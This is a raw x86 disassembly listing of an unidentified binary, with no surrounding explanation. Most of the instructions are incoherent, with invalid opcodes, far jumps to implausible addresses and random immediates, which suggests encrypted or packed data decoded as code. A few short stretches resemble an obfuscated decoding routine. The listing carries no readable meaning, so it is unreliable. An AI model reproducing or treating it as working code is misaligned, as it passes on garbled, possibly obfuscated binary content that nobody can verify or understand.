  408502:	xchg   esp,eax
  408503:	add    esi,0x48
  408506:	gs mov edx,0xea9a0b0c
  40850c:	push   0xb1bccdb6
  408511:	je     0x408514
  408513:	rcr    DWORD PTR [ecx],cl
  408515:	bound  esi,QWORD PTR [ecx+0x4c918fac]
  40851b:	das    
  40851c:	lahf   
  40851d:	loope  0x4084a8
  40851f:	aas    
  408520:	xor    eax,0x41ade3ba
  408525:	int    0xc7
  408527:	and    al,0xdb
  408529:	scas   eax,DWORD PTR es:[edi]
  40852a:	pop    ss
  40852b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40852c:	dec    ebx
  40852d:	and    edx,DWORD PTR [edx+0xca59b56]
  408533:	repnz push 0x76
  408536:	cmc    
  408537:	cmc    
  408538:	pushf  
  408539:	xchg   edi,eax
  40853a:	out    0xf3,al
  40853c:	ins    BYTE PTR es:[edi],dx
  40853d:	adc    eax,DWORD PTR [eax-0x2f]
  408540:	xor    DWORD PTR [esi+0x63],0x6889ee6d
  408547:	ret    0xd4ad
  40854a:	sbb    edi,DWORD PTR [edx]
  40854c:	iret   
  40854d:	lods   al,BYTE PTR ds:[esi]
  40854e:	repz push ebx
  408550:	dec    esi
  408551:	mov    eax,cs:0x5544c05c
  408557:	out    dx,al
  408558:	jo     0x4084ec
  40855a:	sbb    al,0x9a
  40855c:	es jns 0x40858e
  40855f:	imul   ecx,DWORD PTR [edx],0x435e9d1a
  408565:	fld    st(2)
  408567:	sub    al,0xd7
  408569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40856a:	icebp  
  40856b:	xor    ah,BYTE PTR [ebx]
  40856d:	das    
  40856e:	fneni(8087 only) 
  408570:	ret    0x11d
  408573:	ror    esp,cl
  408575:	outs   dx,DWORD PTR ds:[esi]
  408576:	mov    al,al
  408578:	cld    
  408579:	fidivr DWORD PTR [edi+0x735b3cad]
  40857f:	mov    BYTE PTR [eax+0x30],cl
  408582:	das    
  408583:	hlt    
  408584:	outs   dx,DWORD PTR ds:[esi]
  408585:	fs aaa 
  408587:	into   
  408588:	mov    WORD PTR [eax+eiz*8+0x1b],?
  40858c:	xor    DWORD PTR [esi+0x72bb1d7b],ecx
  408592:	push   edi
  408593:	ret    
  408594:	loopne 0x4085a9
  408596:	push   edi
  408597:	mov    cl,0xd3
  408599:	inc    esp
  40859a:	xchg   edx,eax
  40859b:	jno    0x408574
  40859d:	mov    esi,0x5acc08bd
  4085a2:	ss adc esi,eax
  4085a5:	pop    ecx
  4085a6:	mov    ds:0x3f86eab3,eax
  4085ab:	and    ebp,DWORD PTR [ebx]
  4085ad:	loope  0x4085c3
  4085af:	sbb    BYTE PTR ds:0x68311834,ah
  4085b5:	cmp    al,BYTE PTR [ebx-0x3421c669]
  4085bb:	jl     0x4085ce
  4085bd:	jge    0x4085de
  4085bf:	retf   
  4085c0:	mov    WORD PTR [edi-0x23],?
  4085c3:	outs   dx,BYTE PTR ds:[esi]
  4085c4:	(bad)  
  4085c5:	aaa    
  4085c6:	retf   0x8fb1
  4085c9:	dec    esi
  4085ca:	popa   
  4085cb:	inc    edx
  4085cc:	add    ah,BYTE PTR [edx-0x56]
  4085cf:	stc    
  4085d0:	aas    
  4085d1:	in     al,0x14
  4085d3:	nop
  4085d4:	add    esp,eax
  4085d6:	add    BYTE PTR ds:0x1e313a01,dh
  4085dc:	ins    DWORD PTR es:[edi],dx
  4085dd:	fsub   QWORD PTR [edx]
  4085df:	retf   0xa6f6
  4085e2:	dec    eax
  4085e3:	jmp    0x23b72e48
  4085e8:	sbb    DWORD PTR [ecx+ecx*8],edi
  4085eb:	cmp    al,0x2e
  4085ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085ee:	arpl   WORD PTR [ebx+0x95c1818],ax
  4085f4:	cmp    DWORD PTR [edi-0x64],esp
  4085f7:	(bad)  
  4085f8:	(bad)  [edx]
  4085fa:	sbb    DWORD PTR [ebx+0x48377cf6],edx
  408600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408601:	sbb    eax,0xf8325806
  408606:	inc    esp
  408607:	mov    esp,0x3bb8c91f
  40860c:	inc    DWORD PTR [edi-0x24]
  40860f:	jno    0x4085fb
  408611:	retf   0xf271
  408614:	jns    0x408600
  408616:	stos   BYTE PTR es:[edi],al
  408617:	(bad)  
  408618:	xor    eax,0x99996926
  40861d:	call   0x89b8:0xd0efd880
  408624:	jb     0x408655
  408626:	push   eax
  408627:	jbe    0x408605
  408629:	and    ebp,ecx
  40862b:	mov    WORD PTR [eax],?
  40862d:	icebp  
  40862e:	ret    0x7b37
  408631:	sub    al,0x7
  408633:	jmp    0x285d:0xe656b96f
  40863a:	push   esp
  40863b:	push   ss
  40863c:	mov    edi,0x3356ebf2
  408641:	test   al,0xc3
  408643:	sbb    eax,0xe0abb4de
  408648:	push   esp
  408649:	cld    
  40864a:	adc    DWORD PTR [edx],edx
  40864c:	and    ebp,DWORD PTR [eax-0x75e4d655]
  408652:	push   esi
  408653:	sbb    eax,0xebf7459b
  408658:	push   0x3c6d4e40
  40865d:	or     ah,BYTE PTR [ebx+0x70b189f3]
  408663:	jns    0x4086a5
  408665:	pop    ebx
  408666:	dec    ecx
  408667:	out    0xeb,al
  408669:	shr    BYTE PTR [edi-0x30],0x99
  40866d:	div    DWORD PTR [edi+0xf]
  408670:	or     DWORD PTR [ecx],0xffffffc9
  408673:	mul    DWORD PTR [edx+0x4e]
  408676:	ds sbb esp,esi
  408679:	ret    0x68d4
  40867c:	sbb    DWORD PTR [ecx-0x5efcb0a1],ebx
  408682:	dec    edi
  408683:	call   FWORD PTR [edx]
  408685:	sbb    edi,DWORD PTR [ebx+0x5e1a93c1]
  40868b:	cmp    al,ah
  40868d:	mov    cl,0x8
  40868f:	mov    bl,0xd0
  408691:	jbe    0x4086df
  408693:	lock bound ecx,QWORD PTR [edx-0x61]
  408697:	fadd   QWORD PTR [edx+ebx*8]
  40869a:	mov    ebx,0x8e12feb8
  40869f:	adc    DWORD PTR ds:0x433763,0x4336fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4337ef,0x433827
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x7b67c54a],ecx
  4086ca:	jo     0x408656
  4086cc:	(bad)  
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	dec    edx
  4086d4:	xchg   esi,eax
  4086d5:	mov    ch,0xdc
  4086d7:	test   eax,0xc83336c5
  4086dc:	xchg   ebp,eax
  4086dd:	and    esp,DWORD PTR [ecx]
  4086df:	push   0x6cdf4bfd
  4086e4:	dec    edi
  4086e5:	xchg   esi,eax
  4086e6:	push   es
  4086e7:	sbb    DWORD PTR [ebx],edi
  4086e9:	pop    esp
  4086ea:	pop    esp
  4086eb:	xchg   BYTE PTR [ebx],al
  4086ed:	mov    ds:0x2d8bf95a,al
  4086f2:	push   ds
  4086f3:	jbe    0x408706
  4086f5:	dec    eax
  4086f6:	mov    ds,WORD PTR [ecx+0x692d96a3]
  4086fc:	cmp    edi,DWORD PTR [esi]
  4086fe:	xchg   ebx,eax
  4086ff:	cwde   
  408700:	js     0x4086f0
  408702:	xor    al,0xe6
  408704:	inc    eax
  408705:	mov    esp,0xeeb79bcd
  40870a:	mov    al,ds:0x793844c6
  40870f:	(bad)
  408712:	cmp    al,0x20
  408714:	mov    cl,0x23
  408716:	jle    0x408755
  408718:	jl     0x4086a4
  40871a:	adc    dh,BYTE PTR [esi-0x22310759]
  408720:	mov    ds:0xb25ce65c,al
  408725:	lock loope 0x408745
  408728:	add    al,0xde
  40872a:	rcl    cl,cl
  40872c:	xchg   ecx,eax
  40872d:	inc    edx
  40872e:	mov    al,ds:0xe43f2811
  408733:	jo     0x4087b0
  408735:	push   ds
  408736:	adc    ebx,DWORD PTR [edi]
  408738:	icebp  
  408739:	inc    ebp
  40873a:	push   0x3e
  40873c:	sbb    BYTE PTR [ecx],al
  40873e:	and    eax,DWORD PTR [edx+0x2f]
  408741:	retf   
  408742:	push   esi
  408743:	fucomi st,st(7)
  408745:	icebp  
  408746:	mov    dh,0x94
  408748:	push   0xffffffd5
  40874a:	pop    edx
  40874b:	jle    0x4087a6
  40874d:	test   DWORD PTR [ebx],0x4745e797
  408753:	add    eax,0x6833c73c
  408758:	mov    ebx,0x845f1a2b
  40875d:	jnp    0x408763
  40875f:	mov    ds:0x92333771,al
  408764:	mov    dh,0xa0
  408766:	jnp    0x4087cd
  408768:	xor    eax,DWORD PTR [ecx+0x62418794]
  40876e:	(bad)  
  40876f:	adc    ch,BYTE PTR [ebp+0x70]
  408772:	(bad)  
  408773:	xor    BYTE PTR [ecx-0x33541230],bl
  408779:	push   cs
  40877a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40877b:	ins    BYTE PTR es:[edi],dx
  40877c:	pusha  
  40877d:	aam    0xc1
  40877f:	iret   
  408780:	push   esp
  408781:	mov    al,ds:0xd6d0ccc0
  408786:	nop
  408787:	das    
  408788:	pop    ebp
  408789:	test   bh,dl
  40878b:	cmc    
  40878c:	mov    esi,0x3040491b
  408791:	cs (bad) 
  408794:	fadd   st(3),st
  408796:	sbb    DWORD PTR [ebp+0x51dff247],esi
  40879c:	(bad)  
  40879d:	push   ebp
  40879e:	mov    bh,0xc3
  4087a0:	stos   BYTE PTR es:[edi],al
  4087a1:	inc    esp
  4087a2:	xor    eax,0x287e8d49
  4087a7:	push   ds
  4087a8:	cmp    eax,0x42f3cb32
  4087ad:	adc    DWORD PTR [ebx+eax*1],ebx
  4087b0:	lods   eax,DWORD PTR ds:[esi]
  4087b1:	in     al,0xf2
  4087b3:	dec    edx
  4087b4:	mov    al,0x81
  4087b6:	cli    
  4087b7:	push   ebp
  4087b8:	loop   0x4087f1
  4087ba:	rol    bx,0xec
  4087be:	lea    ecx,[edx+0x22]
  4087c1:	fs pop esi
  4087c3:	cdq    
  4087c4:	pop    esp
  4087c5:	adc    BYTE PTR [esi],ch
  4087c7:	or     eax,0xc2b70667
  4087cc:	jo     0x40882a
  4087ce:	cmp    ah,ch
  4087d0:	xor    BYTE PTR [ebp-0x77004a36],0xea
  4087d7:	pop    eax
  4087d8:	xchg   esi,eax
  4087d9:	nop
  4087da:	push   ebp
  4087db:	mov    bh,0x3
  4087dd:	stos   DWORD PTR es:[edi],eax
  4087de:	loopne 0x40877c
  4087e0:	mov    esi,0xee47ece9
  4087e5:	jg     0x7438bbce
  4087eb:	xor    eax,0x17111af3
  4087f0:	xchg   edi,eax
  4087f1:	stos   BYTE PTR es:[edi],al
  4087f2:	(bad)  
  4087f3:	pop    esi
  4087f4:	and    al,0x41
  4087f6:	int3   
  4087f7:	mov    esi,0xcf50cdb2
  4087fc:	scas   al,BYTE PTR es:[edi]
  4087fd:	cmp    ebp,DWORD PTR [ebx-0x4434f3a]
  408803:	push   esp
  408804:	adc    al,BYTE PTR [edx+0x5991120a]
  40880a:	inc    ecx
  40880b:	inc    edx
  40880c:	jle    0x4087a4
  40880e:	(bad)  
  40880f:	nop
  408810:	push   edx
  408811:	jge    0x4087ec
  408813:	pop    edx
  408814:	nop
  408815:	xchg   esi,eax
  408816:	add    eax,0x831ddc88
  40881b:	adc    BYTE PTR [ebp+0xf4ef087],al
  408821:	mov    edi,0x9999541c
  408826:	nop
  408827:	sbb    BYTE PTR [eax+0x7e],cl
  40882a:	inc    ebx
  40882b:	and    BYTE PTR [ebx+esi*8+0xf],ah
  40882f:	mov    ch,bl
  408831:	xchg   ebx,eax
  408832:	mov    eax,0x6a07470f
  408837:	aam    0x74
  408839:	in     eax,dx
  40883a:	lods   al,BYTE PTR ds:[esi]
  40883b:	in     al,0xae
  40883d:	pop    ss
  40883e:	rcl    BYTE PTR [esp+eax*8-0x4c],1
  408842:	pop    ss
  408843:	jge    0x40886e
  408845:	imul   ecx,DWORD PTR [edi+0xf],0xffffffe7
  408849:	loop   0x4087d3
  40884b:	rcl    al,cl
  40884d:	sub    DWORD PTR [ebx-0x57],ecx
  408850:	or     eax,0x51610a5d
  408855:	lods   eax,DWORD PTR ds:[esi]
  408856:	out    dx,eax
  408857:	scas   al,BYTE PTR es:[edi]
  408858:	inc    esp
  408859:	shl    ebp,0x1b
  40885c:	fcmove st,st(3)
  40885e:	pop    esi
  40885f:	mov    ds:0x588b125f,eax
  408864:	dec    esi
  408865:	mov    ch,0x16
  408867:	mov    ds:0xf33e68fa,eax
  40886c:	dec    esi
  40886d:	aam    0xdf
  40886f:	push   0x47
  408871:	cmp    dl,BYTE PTR [ecx+0x3b]
  408874:	add    esp,DWORD PTR [edx-0x33]
  408877:	mov    edi,0x3c8e86a5
  40887c:	aaa    
  40887d:	les    esi,FWORD PTR [ebp+edi*1+0xd6818fd]
  408884:	sub    eax,0x92448caf
  408889:	int    0xfd
  40888b:	cwde   
  40888c:	xor    BYTE PTR [ebp-0x3f],ch
  40888f:	push   edi
  408890:	xchg   ebx,eax
  408891:	sub    BYTE PTR [ecx+0x7665174b],0x14
  408898:	loopne 0x40881c
  40889a:	push   eax
  40889b:	jno    0x4088b9
  40889d:	out    dx,eax
  40889e:	hlt    
  40889f:	cmp    eax,0x756b631f
  4088a4:	inc    ecx
  4088a5:	hlt    
  4088a6:	adc    DWORD PTR [eax-0x7720e036],0xffffffc6
  4088ad:	cwd    
  4088af:	and    BYTE PTR [eax-0x21],dh
  4088b2:	addr16 dec ebx
  4088b4:	pop    eax
  4088b5:	int    0x1c
  4088b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088b8:	dec    ecx
  4088b9:	and    esi,edi
  4088bb:	pop    edi
  4088bc:	inc    edi
  4088bd:	sbb    DWORD PTR [ebp+0x67],edx
  4088c0:	ror    BYTE PTR [esi+0x5],0x2a
  4088c4:	out    dx,eax
  4088c5:	push   0xffffffda
  4088c7:	lods   al,BYTE PTR ds:[esi]
  4088c8:	shr    DWORD PTR [ebx+edx*2+0x55],0x5d
  4088cd:	in     al,dx
  4088ce:	es enter 0xb103,0x66
  4088d3:	cmp    DWORD PTR [edi+0x3ff5cd08],edx
  4088d9:	or     ebx,DWORD PTR [edx]
  4088db:	mov    eax,0x84be0f48
  4088e0:	pop    ebp
  4088e1:	sub    ecx,ecx
  4088e3:	outs   dx,DWORD PTR ds:[esi]
  4088e4:	jg     0x4088bd
  4088e6:	mov    bl,0x97
  4088e8:	ins    BYTE PTR es:[edi],dx
  4088e9:	mov    esp,0x7a4f3ddb
  4088ee:	scas   eax,DWORD PTR es:[edi]
  4088ef:	sbb    DWORD PTR [eax-0x54a645e6],esp
  4088f5:	mov    edx,0xa945ab8a
  4088fa:	ss test al,0xe3
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x433763,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x4337db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433753,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43371f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433827,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x99f0fe2c
  408968:	mov    esp,0x7e7ed4b0
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	jl     0x4089ea
  408973:	mov    esi,0xa16b48e6
  408978:	aam    0xb1
  40897a:	and    DWORD PTR [ebp+0x6e749840],ebx
  408980:	les    ecx,FWORD PTR [ebx-0x29]
  408983:	lahf   
  408984:	stos   DWORD PTR es:[edi],eax
  408985:	adc    DWORD PTR [ebp-0x36],ecx
  408988:	or     eax,eax
  40898a:	push   ss
  40898b:	leave  
  40898c:	add    DWORD PTR ds:0x63465758,eax
  408992:	pop    esp
  408993:	call   0x57765f2a
  408998:	xor    eax,0xf32d61de
  40899d:	inc    edx
  40899e:	cmp    BYTE PTR [edi],cl
  4089a0:	pop    ss
  4089a1:	(bad)  
  4089a3:	(bad)  
  4089a4:	pop    edi
  4089a5:	das    
  4089a6:	xchg   DWORD PTR [esi+ecx*4+0x34a80495],ecx
  4089ad:	enter  0x80de,0x8e
  4089b1:	inc    eax
  4089b2:	inc    edx
  4089b3:	fild   QWORD PTR [eax]
  4089b5:	test   DWORD PTR [esi+0x4ba9758f],eax
  4089bb:	sub    BYTE PTR [ebx+eax*8],0x86
  4089bf:	dec    ebx
  4089c0:	clc    
  4089c1:	cmc    
  4089c2:	fist   WORD PTR [ecx+0x1f]
  4089c5:	xor    al,0x26
  4089c7:	sbb    ebx,DWORD PTR [edi-0x146a4512]
  4089cd:	in     al,dx
  4089ce:	push   eax
  4089cf:	sbb    eax,0x10c55d13
  4089d4:	jmp    0x9b10753f
  4089d9:	imul   ch
  4089db:	test   DWORD PTR ds:0xffab24a8,edi
  4089e1:	arpl   WORD PTR [ebx],cx
  4089e3:	fisttp WORD PTR [eax]
  4089e5:	and    eax,0x9cc8d1c1
  4089ea:	cmp    BYTE PTR [ecx+0x15955ca2],dh
  4089f0:	rol    DWORD PTR [ebp+0x34d95532],0xaa
  4089f7:	xchg   ebp,eax
  4089f8:	jle    0x4089cf
  4089fa:	inc    esi
  4089fb:	in     al,0x5b
  4089fd:	out    0xe2,al
  4089ff:	pop    edx
  408a00:	int    0xf0
  408a02:	adc    bl,BYTE PTR [edi+0x19e1658]
  408a08:	out    0x7b,eax
  408a0a:	jmp    0x1133:0xe93f9ed8
  408a11:	shr    DWORD PTR [ebp+0x579f23b8],0xf5
  408a18:	adc    ch,BYTE PTR [ebp-0x2]
  408a1b:	sub    DWORD PTR [ecx-0x69],0xc03b0c73
  408a22:	mov    al,0x17
  408a24:	and    BYTE PTR [ecx+0x1b],dl
  408a27:	cli    
  408a28:	inc    edi
  408a29:	popf   
  408a2a:	dec    edi
  408a2b:	xor    eax,0x84b8de94
  408a30:	push   cs
  408a31:	mov    dh,0x25
  408a33:	jb     0x408a1b
  408a35:	inc    esi
  408a36:	add    ch,bl
  408a38:	sahf   
  408a39:	jb     0x4089f2
  408a3b:	fucom  st(4)
  408a3d:	out    0xce,al
  408a3f:	stos   BYTE PTR es:[edi],al
  408a40:	and    eax,0x904bf7e6
  408a45:	pop    ecx
  408a46:	lock sub cl,0xdb
  408a4a:	cmp    al,0x2
  408a4c:	and    eax,0x3a1ad6ac
  408a51:	pop    esi
  408a52:	mov    DWORD PTR [eax+ebp*8+0x1c],esi
  408a56:	inc    eax
  408a57:	pop    ebp
  408a58:	fistp  QWORD PTR [ebp-0x2bc3ba0b]
  408a5e:	ja     0x4089e6
  408a60:	xchg   esp,eax
  408a61:	add    al,0x15
  408a63:	js     0x4089e8
  408a65:	mov    dh,0xa5
  408a67:	js     0x408a67
  408a69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a6a:	fs out dx,eax
  408a6c:	sub    eax,edx
  408a6e:	mov    ebx,0x286feb7
  408a73:	aaa    
  408a74:	shl    al,0x7f
  408a77:	xchg   BYTE PTR [ebp-0x64780ef1],bl
  408a7d:	stos   DWORD PTR es:[edi],eax
  408a7e:	lahf   
  408a7f:	in     eax,0xbe
  408a81:	icebp  
  408a82:	in     eax,0x69
  408a84:	(bad)  
  408a86:	jle    0x408a4c
  408a88:	push   ecx
  408a89:	mov    bh,0xd9
  408a8b:	shl    BYTE PTR [edx+0x7e],0x83
  408a8f:	or     eax,0x6fde5943
  408a94:	pop    ds
  408a95:	jbe    0x408b0e
  408a97:	mov    eax,0x9e7ea4c5
  408a9c:	push   0xb62700b2
  408aa1:	sbb    dh,BYTE PTR [ebp+0x1f]
  408aa4:	and    bh,BYTE PTR [ecx]
  408aa6:	inc    esp
  408aa7:	pop    edi
  408aa8:	pop    esp
  408aa9:	aad    0x24
  408aab:	scas   eax,DWORD PTR es:[edi]
  408aac:	popa   
  408aad:	mov    ah,0x4
  408aaf:	stc    
  408ab0:	addr16 call 0x78c9:0x9ca371cc
  408ab8:	icebp  
  408ab9:	popf   
  408aba:	es imul eax,esp,0x85a5f4f4
  408ac1:	aaa    
  408ac2:	(bad)  
  408ac3:	push   ss
  408ac4:	mov    eax,ds:0xd4765b19
  408ac9:	fnsave [ebp-0x528ef515]
  408acf:	fst    DWORD PTR [ecx-0x69d91166]
  408ad5:	cmp    edi,DWORD PTR [eax+0x8db9069]
  408adb:	js     0x408b53
  408add:	add    DWORD PTR [edx+0x37],esp
  408ae0:	call   0xa2d6:0x4bffa5df
  408ae7:	sbb    ch,BYTE PTR [eax+0x5bc8e6fd]
  408aed:	outs   dx,BYTE PTR ds:[esi]
  408aee:	cmp    BYTE PTR ds:0x94e254b0,0xc5
  408af5:	(bad)  
  408af6:	pop    ds
  408af7:	xlat   BYTE PTR ds:[ebx]
  408af8:	ret    0x503b
  408afb:	and    eax,0x19f413ee
  408b00:	lea    esp,[eax]
  408b02:	loopne 0x408b07
  408b04:	mov    eax,ds:0x48cf6504
  408b09:	mov    al,ds:0xaaeaf2c1
  408b0e:	ret    0x9fa9
  408b11:	dec    ebx
  408b12:	(bad)  
  408b13:	jb     0x408abd
  408b15:	mov    ebp,0x3c0893b5
  408b1b:	or     BYTE PTR [ecx+eiz*8+0x31],bl
  408b1f:	push   0x3
  408b21:	fucomi st,st(6)
  408b23:	data16 fmul st,st(2)
  408b26:	jnp    0x408aff
  408b28:	lahf   
  408b29:	clc    
  408b2a:	mov    esp,0x2022299d
  408b2f:	das    
  408b30:	shl    ecx,cl
  408b32:	or     BYTE PTR [esi],bh
  408b34:	mov    DWORD PTR [eax+edx*4],ebp
  408b37:	xchg   BYTE PTR [ecx],cl
  408b39:	cmp    eax,0xc5779be8
  408b3e:	pop    edi
  408b3f:	mov    BYTE PTR [edi+0x2bfb938b],bh
  408b45:	mov    esp,0xd80c3a40
  408b4a:	leave  
  408b4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b4c:	fist   DWORD PTR ds:0x2dd4b7e6
  408b52:	or     DWORD PTR [ebx-0xc385e12],eax
  408b58:	sub    al,0x6a
  408b5a:	adc    eax,DWORD PTR [edi-0x1d]
  408b5d:	dec    ebp
  408b5e:	outs   dx,DWORD PTR ds:[esi]
  408b5f:	push   esi
  408b60:	pop    ebp
  408b61:	mov    ebx,0x34e31f4e
  408b66:	test   al,0x65
  408b68:	sub    esi,DWORD PTR [edi+ebp*2-0x34]
  408b6c:	pop    ss
  408b6d:	into   
  408b6e:	stos   DWORD PTR es:[edi],eax
  408b6f:	pextrw ebx,mm2,0xed
  408b73:	dec    esp
  408b74:	test   DWORD PTR [edi],esp
  408b76:	mov    edx,0x7fdde000
  408b7b:	shr    bh,cl
  408b7d:	cmp    eax,0xbcab764
  408b82:	lahf   
  408b83:	jbe    0x18eedfe7
  408b89:	push   0x302cfd55
  408b8e:	sbb    al,0x7b
  408b90:	push   0x4ac9c8dd
  408b95:	popa   
  408b96:	sahf   
  408b97:	fldcw  WORD PTR [ecx-0x7af0f4b8]
  408b9d:	sbb    eax,0x8b000000
  408ba2:	inc    ebp
  408ba3:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	ins    DWORD PTR es:[edi],dx
  408bf1:	repnz mov ebp,0x7ed2661f
  408bf7:	jle    0x408c1d
  408bf9:	jl     0x408c79
  408bfb:	jle    0x408c03
  408bfd:	mov    al,0xb6
  408bff:	sub    ah,BYTE PTR [edi]
  408c01:	cmp    cl,BYTE PTR [eax+0x25ad4f53]
  408c07:	imul   BYTE PTR ds:0x48d31416
  408c0d:	fwait
  408c0e:	add    cl,BYTE PTR [esi-0x66]
  408c11:	dec    esp
  408c12:	test   DWORD PTR [edi+0xb20f9f3],edi
  408c18:	(bad)  
  408c19:	sub    al,0x81
  408c1b:	mov    edx,0x767de99c
  408c20:	adc    BYTE PTR [edi+0x1a],bh
  408c23:	test   ch,bl
  408c25:	rcl    BYTE PTR [esi+0x7fc90443],0xd4
  408c2c:	jecxz  0x408c3e
  408c2e:	int3   
  408c2f:	cvtpi2ps xmm7,QWORD PTR [esi-0x79]
  408c33:	jmp    0xb6f2:0xb628cf46
  408c3a:	in     al,dx
  408c3b:	bound  ebx,QWORD PTR [ecx]
  408c3d:	not    BYTE PTR [ebp-0x22aeef73]
  408c43:	pop    ebx
  408c44:	loope  0x408c33
  408c46:	ss ja  0x408c97
  408c49:	ret    
  408c4a:	push   ebx
  408c4b:	cmp    eax,0x19c2a4cc
  408c50:	pop    ebx
  408c51:	out    dx,al
  408c52:	pop    ss
  408c53:	mov    esp,0x8b03337f
  408c58:	push   esp
  408c59:	out    0x31,al
  408c5b:	or     eax,0x7e95de64
  408c60:	mov    esp,0xe83db90f
  408c65:	xor    DWORD PTR [esi+0x38],0xffffffaf
  408c69:	jg     0x408bfb
  408c6b:	mov    ah,0xf2
  408c6d:	int3   
  408c6e:	mov    ds:0x44e1da96,al
  408c73:	push   cs
  408c74:	add    ch,0x14
  408c77:	into   
  408c78:	daa    
  408c79:	adc    eax,0x3dafb9ca
  408c7e:	fidivr WORD PTR [eax-0x3df57bb0]
  408c84:	push   esi
  408c85:	and    bh,BYTE PTR [ebp+0x3d]
  408c88:	dec    ebx
  408c89:	ret    
  408c8a:	(bad)  
  408c8b:	adc    edi,DWORD PTR [ebx+ecx*8+0x2bf1d04a]
  408c92:	mov    eax,0x2a122f37
  408c97:	xor    bh,ah
  408c99:	xor    BYTE PTR [esi],cl
  408c9b:	pop    ebx
  408c9c:	clc    
  408c9d:	xchg   edi,eax
  408c9e:	(bad)  
  408c9f:	fmul   DWORD PTR [edi]
  408ca1:	outs   dx,DWORD PTR ds:[esi]
  408ca2:	push   eax
  408ca3:	push   esp
  408ca4:	add    al,0x3c
  408ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ca7:	shl    BYTE PTR [edi-0x7c],1
  408caa:	in     al,0x70
  408cac:	popf   
  408cad:	mov    ebx,0xa3d83c3
  408cb2:	hlt    
  408cb3:	or     BYTE PTR [eax],0xb
  408cb6:	cld    
  408cb7:	push   0xb13a32ea
  408cbc:	neg    DWORD PTR [eax+0x1d6feaf0]
  408cc2:	test   BYTE PTR [eax-0x3f],ah
  408cc5:	ret    
  408cc6:	mov    bh,0x78
  408cc8:	pop    ss
  408cc9:	dec    eax
  408cca:	arpl   WORD PTR [ebp-0x9],bp
  408ccd:	(bad)  
  408cce:	out    dx,eax
  408ccf:	push   eax
  408cd0:	xor    al,0xcc
  408cd2:	push   edi
  408cd3:	jge    0x408c89
  408cd5:	retf   
  408cd6:	pop    edx
  408cd7:	enter  0x72a1,0xa5
  408cdb:	add    DWORD PTR [ecx+edi*2-0x463ccb6d],edi
  408ce2:	aad    0x9a
  408ce4:	add    edx,ecx
  408ce6:	outs   dx,BYTE PTR ds:[esi]
  408ce7:	repz mov edi,0xe027aeea
  408ced:	sbb    al,0xfc
  408cef:	(bad)  
  408cf0:	gs fdivr st(1),st
  408cf3:	cmp    ch,BYTE PTR [edi+ebx*4-0x62905f76]
  408cfa:	call   0x622d996f
  408cff:	mov    ch,0x68
  408d01:	xchg   ebx,eax
  408d02:	or     al,0xfb
  408d04:	inc    eax
  408d05:	fstp   QWORD PTR [edx-0x4c]
  408d08:	mov    esi,0x9c33f2cd
  408d0d:	jno    0x408d4d
  408d0f:	push   ds
  408d10:	xchg   edx,eax
  408d11:	push   ecx
  408d12:	push   ecx
  408d13:	sub    eax,0xe9561557
  408d18:	and    al,0x32
  408d1a:	mov    al,ds:0x28ba5149
  408d1f:	les    ebp,FWORD PTR [edx+edx*4+0x1991bd8a]
  408d26:	cmp    bh,BYTE PTR [ecx-0x19]
  408d29:	dec    ebx
  408d2a:	sub    ecx,DWORD PTR [ebx+edx*8]
